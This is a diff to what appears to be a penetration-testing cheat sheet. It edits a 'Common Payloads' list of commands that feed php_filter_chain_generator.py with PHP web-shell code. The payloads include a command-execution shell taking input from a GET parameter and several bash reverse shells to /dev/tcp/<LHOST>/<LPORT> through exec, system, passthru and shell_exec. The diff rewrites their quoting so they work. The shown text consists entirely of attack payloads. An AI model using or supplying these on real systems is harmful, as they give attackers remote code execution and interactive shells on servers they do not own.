@@ -5152,11 +5152,12 @@ foreach ($functions_to_test as $func) {
 #### Common Payloads
 
 ```console
-$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
-$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
-$ python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
-$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
-$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
+$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET["0"]); ?>'
+$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec("id"); ?>'
+$ python3 php_filter_chain_generator.py --chain '<?php system("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
+$ python3 php_filter_chain_generator.py --chain '<?php passthru("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
+$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
+$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
 ```
 
 #### Payload Execution
